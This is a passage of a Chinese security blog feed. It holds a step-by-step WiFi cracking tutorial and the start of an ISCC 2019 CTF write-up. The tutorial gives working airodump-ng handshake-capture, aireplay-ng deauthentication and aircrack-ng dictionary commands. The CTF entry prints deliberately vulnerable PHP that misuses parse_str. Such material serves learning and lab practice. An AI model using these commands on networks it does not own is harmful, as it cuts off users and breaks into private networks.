point）的mac地址，在这里ap为路由器</p><p>pwr代表信号水平，信号只越高说明距离越近，但是注意，</p><p>-1值说明无法监听</p><p>ch表示工作的信道号</p><p>enc表示算法加密体系</p><p>cipher表示检测到的加密算法</p><p>auth表示认证协议</p><p>essid即ssid号,wifi的名称</p><p>station表示客户端的mac地址（ctrl-c停止扫描）</p></blockquote><p>5、抓取握手包，从上一步扫描到的结果中选定目标，留意bssid和ch，使用命令</p><p><code>airodump-ng -c 11 --ivs -w test --bssid 74:C3:30:12:DF:D2 wlan0mon</code></p><p>参数：-c 选取频道号 –ivs -w test 保存ivs格式的包，名字为test –bssid 要破解ap的ssid</p><p><a href="https://imgchr.com/i/EWFxGd"><img src="https://s2.ax1x.com/2019/05/10/EWFxGd.png" alt="EWFxGd.png"></a></p><p><strong>注意</strong></p><p>我们只有一般的数据包，是无法进行密码破解的，我们需要的是用户连接WiFi时的握手包。</p><p>在上面的图中，出现这个信息，说明成功抓到了握手包</p><p><img src="https://s2.ax1x.com/2019/05/10/EWkCsP.png" alt="EWkCsP.png"></p><p>但是，我们不一定每次都能正好抓到这个包，所以，我们需要使用一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；</p><p>原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。</p><p>aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。打开新终端执行： </p><p><code>aireplay-ng -0 10 -a 74:C3:30:12:DF:D2 -c 90:F0:52:70:F7:13 wlan0mon</code></p><blockquote><p>参数：-0指定发送反认证包的个数 -a指定无线路由器BSSID -c指定强制断开的设备。</p></blockquote><p>直到出现上面的信息(红色框框)，说明成功抓到握手包，Ctrl+c结束。</p><p>抓到握手包后，就可以结束监控模式了</p><p><img src="https://s2.ax1x.com/2019/05/10/EWkkdS.png" alt="EWkkdS.png"></p><h4 id="用字典爆破密码"><a href="#用字典爆破密码" class="headerlink" title="用字典爆破密码"></a>用字典爆破密码</h4><p>开始破解密码，执行如下的命令，就可以看到已经破解出密码，如果密码复杂一点，可能需要的时间。aircrack-ng -w 字典 保存的包</p><p><code>aircrack-ng -w /root/wifi.txt /root/test-01.ivs</code>（要使用绝对路径）</p><p>wifi.txt是爆破字典，test-01.ivs是抓的包的文件</p><p><img src="https://s2.ax1x.com/2019/05/10/EWkKs0.png" alt="EWkKs0.png"></p><p>成功得到密码。</p><h4 id="错误警告"><a href="#错误警告" class="headerlink" title="错误警告"></a>错误警告</h4><p>1、实验过程中USB网卡可能检测不到，看看型号问题</p><p>2、检测到了网卡了，但是不显示WiFi的网络适配器，看看驱动问题</p><p>3、检测到网卡，也有WiFi设置，但是检测不到WiFi信号，输入命令<code>service NetworkManager start</code>，还检测不到信号，说明NetworkManager故障，重装虚拟机。</p><p>个人见解。。。。。。</p><p><a href="https://blog.51cto.com/520yg/1983192">参考文章</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;物联网安全实践一</summary>
    
    
    
    <category term="IoT" scheme="http://example.com/categories/IoT/"/>
    
    
    <category term="IoT" scheme="http://example.com/tags/IoT/"/>
    
    <category term="wifi密码破解" scheme="http://example.com/tags/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>ISCC_2019</title>
    <link href="http://example.com/2019/05/02/%E5%A4%A7%E5%AD%A6CTF/ISCC-2019/"/>
    <id>http://example.com/2019/05/02/%E5%A4%A7%E5%AD%A6CTF/ISCC-2019/</id>
    <published>2019-05-02T14:21:13.000Z</published>
    <updated>2021-05-23T10:24:02.881Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>过来划划水<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$hashed_key</span> = <span class="string">&#x27;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#x27;</span>;</span><br><span class="line"><span class="variable">$parsed</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$parsed</span>[<span class="string">&quot;query&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$parsed</span>[<span class="string">&quot;query&quot;</span>];</span><br><span class="line">    <span class="variable">$parsed_query</span> = parse_str(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parsed_query</span>!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="variable">$parsed_query</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&quot;auth&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&quot;key&quot;</span>];</span><br><span class="line">        <span class="variable">$hashed_input</span> = hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$hashed_input</span>!==<span class="variable">$hashed_key</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;img src=&#x27;cxk.jpg&#x27;&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>parse_url</strong>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p><strong>parse_str</strong> — 将字符串解析成多个变量</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;过来划划水</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
  </entry>
  
</feed>
